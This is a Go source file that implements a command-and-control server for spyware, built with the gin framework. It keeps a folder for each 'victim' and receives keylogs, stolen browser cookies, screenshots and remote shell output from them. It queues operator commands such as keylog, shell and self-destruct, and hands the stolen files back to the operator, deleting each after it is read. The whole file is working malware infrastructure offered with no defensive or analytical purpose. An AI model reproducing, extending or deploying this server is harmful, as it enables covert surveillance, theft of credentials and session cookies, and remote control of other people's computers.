package main

import (
	"bufio"
	"bytes"
	"fmt"
	"github.com/gin-gonic/gin"
	_ "github.com/gin-gonic/gin"
	"image"
	"image/png"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
	"time"
)
import _ "net/http"

type Log struct {
	Date   time.Time `json:"date"`
	Victim string    `json:"victim"`
}

type TextLog struct {
	Log  Log    `json:"log"`
	Body string `json:"body"`
}

type VictimLog struct {
	Victim string `uri:"victim"`
}

type ImageLog struct {
	Log  Log    `json:"log"`
	Body []byte `json:"body"`
}

const (
	KeylogAction        = "keylog"
	LazyKeylogAction    = "lazyKeylog"
	CookieMonsterAction = "cookies"
	ScreenshotAction    = "screenshot"
	ShellAction         = "shell"
	SelfDestructAction  = "self-destruct"
	StopAction          = "stop-(keylog|lazyKeylog)"

	KeylogFilename      = "keylog.txt"
	ScreenshotFilename  = "ss.png"
	LazyKeylogFilename  = "lazyKeylog.txt"
	CookiesFilename     = "cookies.txt"
	ShellOutputFilename = "shell.txt"

	ErrorMessage = "No action"
	ActionKey    = "action"
)

var CommandsStack []TextLog

func main() {

	sv := gin.Default()

	sv.POST("/", func(c *gin.Context) {
		var text TextLog
		if err := c.ShouldBindJSON(&text); err == nil {
			file, err := os.OpenFile(fmt.Sprintf("victim-%s/%s", text.Log.Victim, KeylogFilename), os.O_APPEND|os.O_CREATE, 0755)
			defer func(file *os.File) {
				err := file.Close()
				if err != nil {
					c.JSON(http.StatusInternalServerError, nil)
				}
			}(file)
			if err != nil {
				c.JSON(http.StatusServiceUnavailable, gin.H{
					ActionKey: "Not an available file",
				})
				return
			}
			err = LogEntry(file, &text, false)
			if err != nil {
				c.JSON(http.StatusBadRequest, gin.H{
					ActionKey: "cannot append to file",
				})
				return
			}
		}
		c.JSON(201, struct{}{})
	})

	sv.POST("/lazyKeylog", func(c *gin.Context) {
		var text TextLog
		if err := c.ShouldBindJSON(&text); err == nil {
			file, err := os.OpenFile(fmt.Sprintf("victim-%s/%s", text.Log.Victim, LazyKeylogFilename), os.O_APPEND|os.O_CREATE, 0755)
			defer func(file *os.File) {
				err := file.Close()
				if err != nil {
					c.JSON(http.StatusInternalServerError, nil)
				}
			}(file)
			if err != nil {
				c.JSON(http.StatusServiceUnavailable, gin.H{
					ActionKey: "Not an available file",
				})
				return
			}
			err = LogEntry(file, &text, true)
			if err != nil {
				c.JSON(http.StatusBadRequest, gin.H{
					ActionKey: "cannot append to file",
				})
				return
			}
		}
		c.JSON(201, struct{}{})
	})

	sv.POST("/commands", func(context *gin.Context) {
		var victim TextLog
		if err := context.ShouldBindJSON(&victim); err == nil {
			if len(CommandsStack) > 0 {
				comm := getCommand(victim.Log.Victim)
				if comm == nil {
					context.JSON(http.StatusNotFound, gin.H{
						ActionKey: ErrorMessage,
					})
					return
				}
				context.JSON(http.StatusOK, gin.H{
					ActionKey: comm.Body,
				})
				return
			}
		}
		context.JSON(http.StatusNotFound, gin.H{
			ActionKey: ErrorMessage,
		})
	})

	sv.POST("/appendCommands", func(context *gin.Context) {
		var command TextLog
		if err := context.ShouldBindJSON(&command); err == nil {
			CommandsStack = append(CommandsStack, command)
			context.JSON(http.StatusOK, struct{}{})
			return
		}
		context.JSON(http.StatusNotFound, gin.H{
			ActionKey: ErrorMessage,
		})
	})

	sv.POST("/owner", func(context *gin.Context) {
		var text TextLog
		if err := context.ShouldBindJSON(&text); err == nil {
			if _, err = os.Stat(fmt.Sprintf("./victim-%s", text.Log.Victim)); os.IsNotExist(err) {
				err := os.Mkdir(fmt.Sprintf("victim-%s", text.Log.Victim), 0755)
				if err != nil {
					context.JSON(http.StatusBadRequest, gin.H{
						ActionKey: "Cannot create directory",
					})
				}
			}
		}
		context.JSON(201, struct{}{})
	})

	sv.POST("/cookies", func(c *gin.Context) {
		var text TextLog
		if err := c.ShouldBindJSON(&text); err == nil {
			file, err := os.OpenFile(fmt.Sprintf("victim-%s/%s", text.Log.Victim, CookiesFilename), os.O_APPEND|os.O_CREATE, 0755)
			defer func(file *os.File) {
				err := file.Close()
				if err != nil {
					c.JSON(http.StatusInternalServerError, nil)
				}
			}(file)
			if err != nil {
				c.JSON(http.StatusServiceUnavailable, gin.H{
					ActionKey: "Not an available file",
				})
				return
			}
			err = LogEntry(file, &text, true)
			if err != nil {
				c.JSON(http.StatusBadRequest, gin.H{
					ActionKey: "cannot append to file",
				})
				return
			}
		}
		c.JSON(201, struct{}{})
	})

	sv.POST("/shell", func(c *gin.Context) {
		var text TextLog
		if err := c.ShouldBindJSON(&text); err == nil {
			file, err := os.OpenFile(fmt.Sprintf("victim-%s/%s", text.Log.Victim, ShellOutputFilename), os.O_APPEND|os.O_CREATE, 0755)
			defer func(file *os.File) {
				err := file.Close()
				if err != nil {
					c.JSON(http.StatusInternalServerError, nil)
				}
			}(file)
			if err != nil {
				c.JSON(http.StatusServiceUnavailable, gin.H{
					ActionKey: "Not an available file",
				})
				return
			}
			err = LogEntry(file, &text, true)
			if err != nil {
				c.JSON(http.StatusBadRequest, gin.H{
					ActionKey: "cannot append to file",
				})
				return
			}
		}
		c.JSON(201, struct{}{})
	})

	sv.POST("/screenshot", func(c *gin.Context) {
		var text ImageLog
		if err := c.ShouldBindJSON(&text); err == nil {
			img, err := png.Decode(bytes.NewReader(text.Body))
			if err != nil {
				fmt.Println(err)
				c.JSON(400, nil)
				return
			}

			//save the imgByte to file
			out, err := os.Create(fmt.Sprintf("victim-%s/%s", text.Log.Victim, ScreenshotFilename))
			defer out.Close()

			if err != nil {
				fmt.Println(err)
				c.JSON(400, nil)
				return
			}

			err = png.Encode(out, img)

			if err != nil {
				fmt.Println(err)
				c.JSON(400, nil)
				return
			}
		} else {
			fmt.Println(err)
		}
		c.JSON(201, struct{}{})
	})

	sv.GET("/screenshot/:victim", func(c *gin.Context) {
		var text VictimLog
		if err := c.BindUri(&text); err != nil {
			c.AbortWithError(http.StatusBadRequest, err)
			return
		}
		img, err := getImageFromFilePath(fmt.Sprintf("victim-%s/%s", text.Victim, ScreenshotFilename))
		if err != nil {
			c.AbortWithError(http.StatusBadRequest, err)
			return
		}
		buf := new(bytes.Buffer)
		err = png.Encode(buf, img)
		if err != nil {
			c.AbortWithError(http.StatusBadRequest, err)
			return
		}
		send := buf.Bytes()
		c.JSON(200, send)
	})

	sv.GET("/cookies/:victim", func(c *gin.Context) {
		GetFileContent(c, CookiesFilename)
	})

	sv.GET("/victims/", func(c *gin.Context) {
		var rez []string
		files, err := ioutil.ReadDir("./")
		if err != nil {
			c.AbortWithError(400, err)
		}
		for _, file := range files {
			if file.IsDir() && strings.HasPrefix(file.Name(), "victim") {
				rez = append(rez, file.Name())
			}
		}
		c.JSON(200, rez)
	})

	sv.GET("/keylog/:victim", func(c *gin.Context) {
		GetFileContent(c, KeylogFilename)
	})

	sv.GET("/shell/:victim", func(c *gin.Context) {
		GetFileContent(c, ShellOutputFilename)
	})

	sv.GET("/lazyKeylog/:victim", func(c *gin.Context) {
		GetFileContent(c, LazyKeylogFilename)
	})

	sv.Run()
}

func GetFileContent(c *gin.Context, filename string) {
	var victim VictimLog
	if err := c.BindUri(&victim); err != nil {
		c.AbortWithError(http.StatusBadRequest, err)
		return
	}
	text, err := getTextFromFilePath(fmt.Sprintf("victim-%s/%s", victim.Victim, filename))
	if err != nil {
		c.AbortWithError(http.StatusBadRequest, err)
		return
	}
	err = os.Remove(fmt.Sprintf("victim-%s/%s", victim.Victim, filename))
	if err != nil {
		c.AbortWithError(http.StatusBadRequest, err)
		return
	}
	c.JSON(200, text)
}

func getCommand(victim string) *TextLog {
	for i := 0; i < len(CommandsStack); i += 1 {
		if CommandsStack[i].Log.Victim == victim {
			comm := CommandsStack[i]
			CommandsStack = append(CommandsStack[:i], CommandsStack[(i+1):]...)
			return &comm
		}
	}
	return nil
}

func getImageFromFilePath(filePath string) (image.Image, error) {
	f, err := os.Open(filePath)
	defer f.Close()
	if err != nil {
		return nil, err
	}
	image, _, err := image.Decode(f)
	return image, err
}

func getTextFromFilePath(filePath string) (string, error) {
	f, err := os.Open(filePath)
	defer f.Close()
	if err != nil {
		return "", err
	}
	rez := ""
	r := bufio.NewReader(f)
	s, _, e := r.ReadLine()
	if e != nil {
		return "", err
	}
	for e == nil {
		rez += string(s)
		rez += "\n"
		s, _, e = r.ReadLine()
	}
	if err != nil {
		return "", err
	}
	return rez, nil
}
